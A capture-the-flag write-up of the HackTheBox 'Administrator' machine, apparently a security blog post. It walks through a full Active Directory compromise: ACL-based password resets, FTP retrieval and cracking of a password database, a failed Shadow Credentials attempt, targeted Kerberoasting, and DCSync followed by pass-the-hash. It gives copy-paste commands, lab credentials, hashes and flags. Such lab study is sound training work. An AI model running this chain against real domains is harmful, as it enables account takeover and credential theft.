---
layout: ctf
title: "HackTheBox: Administrator"
platform: "HackTheBox"
type: "Machine"
difficulty: "Medium"
image: "/assets/img/ctf/administrator.png"
tags: [Windows, Active-Directory, GenericAll, ForceChangePassword, FTP, ACL-Abuse, Hash-Cracking, Shadow-Credentials, Targeted-Kerberoasting, DCSync]
date: 2026-05-13
---

# 🎯 Administrator

**OS:** Windows | **Difficulty:** Medium | **IP:** `10.129.45.108`

![administrator.htb](/assets/img/ctf/data/administrator-htb.png)

---

## ⛓️ TL;DR / Attack Chain
1. **Foothold:** Logged in with provided credentials for `Olivia`. Leveraged Olivia's `GenericAll` rights over `Michael` to reset his password.
2. **User Pivoting:** Used Michael's `ForceChangePassword` rights to compromise `Benjamin`.
3. **Data Extraction:** Exploited Benjamin's membership in the `SHARE MODERATORS` group to access an FTP share and download a Password Safe database (`Backup.psafe3`).
4. **Credential Hunting:** Cracked the database password (`tekieromucho`) to retrieve credentials for `Emily`.
5. **PrivEsc (`Emily` -> `Ethan`):** Attempted Shadow Credentials on `Ethan`, which failed due to a missing Certificate Authority. Switched to Targeted Kerberoasting by setting a fake SPN on Ethan's account using Emily's `GenericWrite` privileges.
6. **Domain Admin:** Cracked Ethan's hash (`limpbizkit`) and abused his `DCSync` rights to dump the NT hash for the `Administrator`.  

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| :--- | :--- | :--- |
| `Olivia` | `ichliebedich` | Initial access credentials provided for the engagement. |
| `Emily` | `UXLCI5iETUSIBoFVTj8yQFKoHjXmb` | Extracted from cracked Backup.psafe3 database. |
| `Ethan` | `limpbizkit` | Captured via Targeted Kerberoasting and cracked. |
| `Administrator` | `3dc553ce4b9fd20bd016e098d2d2fd2e` | Dumped via Ethan's `DCSync` privileges. |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.45.108" ; DOMAIN="administrator.htb" ; USERNAME="Olivia" ; PASSWORD='ichliebedich' && \
  # sudo timedatectl set-ntp off && \ # this in case ntpdate's work is reset automatically
  sudo ntpdate $DOMAIN && \
  echo "$IP $DOMAIN dc.administrator.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 01:35 +0200
Nmap scan report for administrator.htb (10.129.45.108)
Host is up (0.030s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 23:35:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
55033/tcp open  msrpc         Microsoft Windows RPC
55039/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55044/tcp open  msrpc         Microsoft Windows RPC
55053/tcp open  msrpc         Microsoft Windows RPC
55069/tcp open  msrpc         Microsoft Windows RPC
55102/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-05-14T23:36:54
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.99 seconds
```

### BloodHound

```bash
$ bloodhound-python -d $DOMAIN -u $USERNAME -p $PASSWORD -ns $IP -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20260515013443_bloodhound.zip
```

![administrator-1.htb](/assets/img/ctf/data/administrator-1.png)

![administrator-2.htb](/assets/img/ctf/data/administrator-2.png)

![administrator-3.htb](/assets/img/ctf/data/administrator-3.png)

### FTP/21

I tried anonymous login as well as login as `Olivia` but both didn't work:
```bash
$ ftp anonymous@administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password:<ENTER>
530 User cannot log in.
ftp: Login failed
ftp> exit
221 Goodbye.

$ ftp $USERNAME@administrator.htb              
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password:<ichliebedich>
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> exit
221 Goodbye.
```

But maybe the user `BENJAMIN` has access as he is part of `SHARE MODERATORS`. We will check this later.

---

## 🚪 2. Initial Foothold

As we can see in bloodhound, `olivia` has `GenericAll` over `michael` so we can change his password to get access.

```bash
$ evil-winrm -i $IP -u $USERNAME -p $PASSWORD

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Password123! /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\olivia\Documents>
```

![administrator-4.htb](/assets/img/ctf/data/administrator-4.png)

---

## 📈 3.1 Privilege Escalation (`michael` -> `benjamin` -> `emily`)

Same for `benajmin`, `michael` has `ForceChangePassword`:

```bash
$ bloodyAD --host $IP -d $DOMAIN -u michael -p 'Password123!' set password benjamin 'Password123!'
[+] Password changed successfully!

$ ftp benjamin@$IP
Connected to 10.129.45.108.
220 Microsoft FTP Service
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54075|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||54076|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************************************************************************************************************************|   952       33.49 KiB/s    00:00 ETA226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (33.18 KiB/s)
ftp> exit
221 Goodbye.
```

Crack the `.psafe3` password database encryption with `hashcat`:
```bash
$ hashcat -a 0 -m 5200 ./Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

./Backup.psafe3:tekieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: ./Backup.psafe3
Time.Started.....: Fri May 15 02:16:18 2026 (1 sec)
Time.Estimated...: Fri May 15 02:16:19 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/tralsesec/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     9735 H/s (9.22ms) @ Accel:345 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5520/14344385 (0.04%)
Rejected.........: 0/5520 (0.00%)
Restore.Point....: 2760/14344385 (0.02%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#01...: sadie -> jingle
Hardware.Mon.#01.: Util: 80%

Started: Fri May 15 02:15:58 2026
Stopped: Fri May 15 02:16:20 2026
```

Database password: `tekieromucho`.

Now get `pwsafe` to open the database:
```bash
$ sudo apt update && sudo apt install passwordsafe
$ pwsafe ./Backup.psafe3
```

![administrator-5.htb](/assets/img/ctf/data/administrator-5.png)

![administrator-6.htb](/assets/img/ctf/data/administrator-6.png)

We obtain the following credentials:
```
alexander   UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily       UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma        WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Now we can use `nxc` to find which of these credentials are valid:
```bash
$ cat << EOF > users.txt
alexander
emily
emma
EOF

$ cat << EOF > passwords.txt
UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WwANQWnmJnGV07WQN8bMS7FMAbjNur
EOF

$ nxc smb $IP -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.45.108   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.45.108   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
SMB         10.129.45.108   445    DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [-] administrator.htb\alexander:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
SMB         10.129.45.108   445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
```

![administrator-7.htb](/assets/img/ctf/data/administrator-7.png)

Here we go: `emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

---

## 📈 3.2 Privilege Escalation (`emily` -> `ethan`)

![administrator-8.htb](/assets/img/ctf/data/administrator-8.png)

![administrator-9.htb](/assets/img/ctf/data/administrator-9.png)

As `emily` has `GenericWrite` over `ethan` there are two ways to exploit this:
1. By Shadow Credentials
2. By targeted Kerberoasting

We will look at how both paths work (it is very important to know both as sometimes one of them doesn't work depending on the environment - as you will see).

### 1. Shadow Credentials

This attack abuses the feature that we can change the attribute `msDS-KeyCredentialLink` which allows us to add credentials in form of certificates.

Pro: We get access to account without changing the password. It's completely silent in smaller organizations.

Con: It requires the environment to have a Certificate Authority. If there is none - like in this environment - we won't be able to exploit this. Also, a good blue team will always see this as this attack requires to add a new certificate - which might be even blocked for some high-privileged accounts in the first place - and also many tools automatically add *and* remove the added key in very short time which is also very suspicious. A normal user doesn't add a new cert and remove it in one second.

1. Add shadow credentials:
```bash
$ bloodyAD --host $IP -d $DOMAIN -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' add shadowCredentials ethan
[+] KeyCredential generated with following sha256 of RSA key: 586c6f3ddb7d077fb5c94b34c0d8a11fee95d7f5ed1d3da52d8e49a6b9e79c3a
No outfile path was provided. The certificate(s) will be stored with the filename: eP7Gkpu6
[+] Saved PEM certificate at path: eP7Gkpu6_cert.pem
[+] Saved PEM private key at path: eP7Gkpu6_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem eP7Gkpu6_cert.pem -key-pem eP7Gkpu6_priv.pem administrator.htb/ethan eP7Gkpu6.ccache
```

2. Then abuse:
```bash
$ python3 /opt/share/PKINITtools/gettgtpkinit.py -cert-pem eP7Gkpu6_cert.pem -key-pem eP7Gkpu6_priv.pem administrator.htb/ethan eP7Gkpu6.ccache
2026-05-15 02:44:12,099 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-05-15 02:44:12,108 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/opt/share/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/opt/share/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/opt/share/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/usr/lib/python3/dist-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
```

We could also try with `certipy-ad`:
```bash
$ openssl pkcs12 -export -in tvITNrca_cert.pem -inkey tvITNrca_priv.pem -out ethan.pfx -passout pass:1234

$ certipy-ad auth -pfx ethan.pfx -password 1234 -dc-ip $IP -username ethan -domain administrator.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ethan@administrator.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

Exactly the same error we seen before with `gettgtpkinit.py`: The server simply doesn't have a CA for the attack to work. This is why we have to go the targetet kerberoasting path.

### 2. Targeted Kerberoasting

This is the second path: targetet Kerberoasting. Basically we create a new SPN for that account (as we have `GenericWrite` over it), then we request a ticket for that service. Because the ticket is encrypted with the user's password, we can crack it locally.

Pro: The password cracking itself is 100% undetectable as it happens locally. But adding a new SPN might depend on which account and environment it is. If it is common in that specific environment to add new SPNs or for that specific account then it will not look suspicious at all.

Con: Adding a new SPN for a regular user account is noisy. Also if the password is very strong you might not even be able to crack it!

```bash
$ bloodyAD -d $DOMAIN --host $IP -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb set object ethan servicePrincipalName -v 'kek/w'
[+] ethan's servicePrincipalName has been updated

$ nxc ldap $IP -d $DOMAIN -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting /opt/share/targetedKerberoast/kerberoastables.txt
LDAP        10.129.45.108   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.45.108   389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
LDAP        10.129.45.108   389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.45.108   389    DC               [*] Total of records returned 1
LDAP        10.129.45.108   389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 22:52:14.117811, lastLogon: <never>
LDAP        10.129.45.108   389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$34dfbfae5254dee83209c52440aa8cbd$f38482cb54044cca3baf776f25fa7eedcbeb10047823256535916348634cf13b57a8739f0b7dd8e391f46d78cb7bbcdd4bee4825d713293ddd56e75bcf1bece24c12c5e5d3a5a32c8b393259ed25fe70c01c2bfe1a7f15ae5b828e071d2d5af01674270e8979387e3b8de07a9a4034906892dc5936721388f8c92e4f5c1bcc1dffa5d8194d83d98924db89c737750410f3bc109d5f0a2b1fd3df2268ab21d9788a0f2627b1220704a12eb869267ae6f1b9aceb249bd0ef46090d84176a565e2ac82430f3e055b492b27a2363cb8ecc8cdea5cd4803f07b18d9172f4985109e5fe504a8c80639d0d69ad686598149aacd64044cea3c8802d39f90a9d622bc65393a2eebecc1ee3f2693c97867c84e9bf4c0ec0384623e2b72484e772e471d01cacefb2a9c9b1482242cfd56e14ded3885a9c2517ec374e1a4957c67b8a6a1a92c169b3c459c342917edebedc52cdfa16071c4e8f3d9812874b4259b95fa1d4cfd06d58b5cc49f63b7ec2f442a45e7d11d653e4b30c9ab7b6b5510e5d5a567eeb3aec0cf1b7f4a72a59670de5b05bbb0c6213c4dcff02f08d68a2fc6cfd107018310ec1c3240b2bd48b3db1967858615809aa38a83011a7f06f4e3dd49880ba60675f2067a25e9d39e7e7ae5f269c73243e7518f806dc1a2546f4dc7d4ee8efe5f194d10d06d0a110884697451cf260bef1605867c3c9222fee6b071c04d9ee3d9c46a7712f9a96028bf6a4990a0a9a83585ec6a8f45b5c0a3dbe5fab0fc808040e7691b11f1334f31e4a767cdf5155649cc3c53b907666dd6b1a6f81082230e5faca5ce5b2e8b09ac5dffd8bf14e7eb939c5193a179d94a1270ba7ba845e6f783f0d7927b833895ec66b050f6071f1bdcde5fce7ec6f07d6f1fe356f482e867aa74d9131454d433218b6e0d3109a60cb4b59504f8ce57aae8c4130c4ce42c909e887d6b743526edd8c0e0f68620530e4c0769339d5b1e2335a6c0eb1b205c96d5962ef9a9361cccaf3f9594e5434215890bcd6abda238d1b37ede88b24c95039a4af2069ebbb55399b3e22933abdaabe723d6909b1f5c67eec19962faf77d137da4ffefca5eee505883b8a609e65af00b833655cd2b1e527aaee6bff34131088797f22e39695140ab9e4d2bc39ffb39806c0d3d9a6fc923453e7de7cf6b0a96c2b5fcc8adf639bc7d81a84251aafa8381d2ece7512e1578c74ce1df5d8c794bd8d2b4c7e005f5e32b5c31c92725462ce9d7c07c14805fe617c25f18d30672ded6df7faf9bc7bb3b22d634f91eda8133fd243b4d5276f7fc96a4a7f7cf16d02cd15c561399d7df32c4058c8d93aa4ee0d1f2c6c8a2f21adef72086664bf52393cd8f32d09da83e52c43188dcae3dc381fa6881acbd3c6ac7794652c9384d9013f058bfba99af11dc978cfa75d0f51825d5d5236293cc26f550d11da529b3323345b345de078621a4b0d00466fcc6cf651ad055feabfc95b27c1dc17f0178e888d3c505de140d009a6ed8036afbad6be3ad832a3b2796c5bc4f4a42e793cf41b0
```

![administrator-10.htb](/assets/img/ctf/data/administrator-10.png)

Now we can try to crack that with hashcat:
```bash
$ cat << 'EOF' > ethan
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$34dfbfae5254dee83209c52440aa8cbd$f38482cb54044cca3baf776f25fa7eedcbeb10047823256535916348634cf13b57a8739f0b7dd8e391f46d78cb7bbcdd4bee4825d713293ddd56e75bcf1bece24c12c5e5d3a5a32c8b393259ed25fe70c01c2bfe1a7f15ae5b828e071d2d5af01674270e8979387e3b8de07a9a4034906892dc5936721388f8c92e4f5c1bcc1dffa5d8194d83d98924db89c737750410f3bc109d5f0a2b1fd3df2268ab21d9788a0f2627b1220704a12eb869267ae6f1b9aceb249bd0ef46090d84176a565e2ac82430f3e055b492b27a2363cb8ecc8cdea5cd4803f07b18d9172f4985109e5fe504a8c80639d0d69ad686598149aacd64044cea3c8802d39f90a9d622bc65393a2eebecc1ee3f2693c97867c84e9bf4c0ec0384623e2b72484e772e471d01cacefb2a9c9b1482242cfd56e14ded3885a9c2517ec374e1a4957c67b8a6a1a92c169b3c459c342917edebedc52cdfa16071c4e8f3d9812874b4259b95fa1d4cfd06d58b5cc49f63b7ec2f442a45e7d11d653e4b30c9ab7b6b5510e5d5a567eeb3aec0cf1b7f4a72a59670de5b05bbb0c6213c4dcff02f08d68a2fc6cfd107018310ec1c3240b2bd48b3db1967858615809aa38a83011a7f06f4e3dd49880ba60675f2067a25e9d39e7e7ae5f269c73243e7518f806dc1a2546f4dc7d4ee8efe5f194d10d06d0a110884697451cf260bef1605867c3c9222fee6b071c04d9ee3d9c46a7712f9a96028bf6a4990a0a9a83585ec6a8f45b5c0a3dbe5fab0fc808040e7691b11f1334f31e4a767cdf5155649cc3c53b907666dd6b1a6f81082230e5faca5ce5b2e8b09ac5dffd8bf14e7eb939c5193a179d94a1270ba7ba845e6f783f0d7927b833895ec66b050f6071f1bdcde5fce7ec6f07d6f1fe356f482e867aa74d9131454d433218b6e0d3109a60cb4b59504f8ce57aae8c4130c4ce42c909e887d6b743526edd8c0e0f68620530e4c0769339d5b1e2335a6c0eb1b205c96d5962ef9a9361cccaf3f9594e5434215890bcd6abda238d1b37ede88b24c95039a4af2069ebbb55399b3e22933abdaabe723d6909b1f5c67eec19962faf77d137da4ffefca5eee505883b8a609e65af00b833655cd2b1e527aaee6bff34131088797f22e39695140ab9e4d2bc39ffb39806c0d3d9a6fc923453e7de7cf6b0a96c2b5fcc8adf639bc7d81a84251aafa8381d2ece7512e1578c74ce1df5d8c794bd8d2b4c7e005f5e32b5c31c92725462ce9d7c07c14805fe617c25f18d30672ded6df7faf9bc7bb3b22d634f91eda8133fd243b4d5276f7fc96a4a7f7cf16d02cd15c561399d7df32c4058c8d93aa4ee0d1f2c6c8a2f21adef72086664bf52393cd8f32d09da83e52c43188dcae3dc381fa6881acbd3c6ac7794652c9384d9013f058bfba99af11dc978cfa75d0f51825d5d5236293cc26f550d11da529b3323345b345de078621a4b0d00466fcc6cf651ad055feabfc95b27c1dc17f0178e888d3c505de140d009a6ed8036afbad6be3ad832a3b2796c5bc4f4a42e793cf41b0
EOF

$ hashcat -a 0 -m 13100 ethan ~/rockyou.txt

<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$34dfbfae5254dee83209c52440aa8cbd$f38482cb54044cca3baf776f25fa7eedcbeb10047823256535916348634cf13b57a8739f0b7dd8e391f46d78cb7bbcdd4bee4825d713293ddd56e75bcf1bece24c12c5e5d3a5a32c8b393259ed25fe70c01c2bfe1a7f15ae5b828e071d2d5af01674270e8979387e3b8de07a9a4034906892dc5936721388f8c92e4f5c1bcc1dffa5d8194d83d98924db89c737750410f3bc109d5f0a2b1fd3df2268ab21d9788a0f2627b1220704a12eb869267ae6f1b9aceb249bd0ef46090d84176a565e2ac82430f3e055b492b27a2363cb8ecc8cdea5cd4803f07b18d9172f4985109e5fe504a8c80639d0d69ad686598149aacd64044cea3c8802d39f90a9d622bc65393a2eebecc1ee3f2693c97867c84e9bf4c0ec0384623e2b72484e772e471d01cacefb2a9c9b1482242cfd56e14ded3885a9c2517ec374e1a4957c67b8a6a1a92c169b3c459c342917edebedc52cdfa16071c4e8f3d9812874b4259b95fa1d4cfd06d58b5cc49f63b7ec2f442a45e7d11d653e4b30c9ab7b6b5510e5d5a567eeb3aec0cf1b7f4a72a59670de5b05bbb0c6213c4dcff02f08d68a2fc6cfd107018310ec1c3240b2bd48b3db1967858615809aa38a83011a7f06f4e3dd49880ba60675f2067a25e9d39e7e7ae5f269c73243e7518f806dc1a2546f4dc7d4ee8efe5f194d10d06d0a110884697451cf260bef1605867c3c9222fee6b071c04d9ee3d9c46a7712f9a96028bf6a4990a0a9a83585ec6a8f45b5c0a3dbe5fab0fc808040e7691b11f1334f31e4a767cdf5155649cc3c53b907666dd6b1a6f81082230e5faca5ce5b2e8b09ac5dffd8bf14e7eb939c5193a179d94a1270ba7ba845e6f783f0d7927b833895ec66b050f6071f1bdcde5fce7ec6f07d6f1fe356f482e867aa74d9131454d433218b6e0d3109a60cb4b59504f8ce57aae8c4130c4ce42c909e887d6b743526edd8c0e0f68620530e4c0769339d5b1e2335a6c0eb1b205c96d5962ef9a9361cccaf3f9594e5434215890bcd6abda238d1b37ede88b24c95039a4af2069ebbb55399b3e22933abdaabe723d6909b1f5c67eec19962faf77d137da4ffefca5eee505883b8a609e65af00b833655cd2b1e527aaee6bff34131088797f22e39695140ab9e4d2bc39ffb39806c0d3d9a6fc923453e7de7cf6b0a96c2b5fcc8adf639bc7d81a84251aafa8381d2ece7512e1578c74ce1df5d8c794bd8d2b4c7e005f5e32b5c31c92725462ce9d7c07c14805fe617c25f18d30672ded6df7faf9bc7bb3b22d634f91eda8133fd243b4d5276f7fc96a4a7f7cf16d02cd15c561399d7df32c4058c8d93aa4ee0d1f2c6c8a2f21adef72086664bf52393cd8f32d09da83e52c43188dcae3dc381fa6881acbd3c6ac7794652c9384d9013f058bfba99af11dc978cfa75d0f51825d5d5236293cc26f550d11da529b3323345b345de078621a4b0d00466fcc6cf651ad055feabfc95b27c1dc17f0178e888d3c505de140d009a6ed8036afbad6be3ad832a3b2796c5bc4f4a42e793cf41b0:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....cf41b0
Time.Started.....: Fri May 15 03:02:09 2026 (0 secs)
Time.Estimated...: Fri May 15 03:02:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/tralsesec/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1679.2 kH/s (2.86ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> whitetiger
Hardware.Mon.#01.: Util: 22%

Started: Fri May 15 03:02:06 2026
Stopped: Fri May 15 03:02:10 2026
```

`ethan`:`limpbizkit`

---

## 📈 3.3 Privilege Escalation (`ethan` -> `Administrator`)

`ethan` can `DCSync` meaning we can dump all hashes (incl. Administrator's hash):
```bash
$ impacket-secretsdump -just-dc-user Administrator administrator.htb/ethan:limpbizkit@$IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up...
```

`Administrator`:`3dc553ce4b9fd20bd016e098d2d2fd2e`.

Cash:
```bash
$ evil-winrm -i $IP -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt ; cat C:\Users\emily\Desktop\user.txt
30be43f0d13d0d8452a70d7e6986cdfd
a9bb68f5fbe9dddd1fddc1c72ce9904b
```

![administrator-11.htb](/assets/img/ctf/data/administrator-11.png)

---

## 🧠 Retrospective
* **Learnings**
  1. **Environmental Constraints for Shadow Credentials:** While Shadow Credentials are an excellent "silent" way to gain access, they are strictly dependent on the target environment having a Certificate Authority (CA). If the KDC returns `KDC_ERR_PADATA_TYPE_NOSUPP`, it's a clear sign the server doesn't support pre-authentication data types like certificates, and you need a fallback plan.
  2. **The Power of Targeted Kerberoasting:** When you have `GenericWrite` over an account but Shadow Credentials fail, Targeted Kerberoasting is your best friend. By manually adding a `Service Principal Name` (SPN), you can force a regular user account to become roastable, though this is noisier and relies on the strength of the user's password.
  3. **Custom Group Enumeration:** Always investigate non-standard groups like `SHARE MODERATORS`. These are often created for specific administrative tasks and can lead to sensitive file exposure (like the `.psafe3` database found here) that wouldn't be accessible to standard users.
  4. **AD Object Control Chains:** BloodHound is essential for identifying non-obvious paths. A chain of `GenericAll` -> `ForceChangePassword` -> `GenericWrite` can be just as effective as a single high-privileged vulnerability.
  5. **DCSync Readiness:** Any user with `GetChanges` and `GetChangesAll` rights is a de facto Domain Admin. Identifying these users early in the enumeration phase provides a direct "win condition" once the account is compromised.
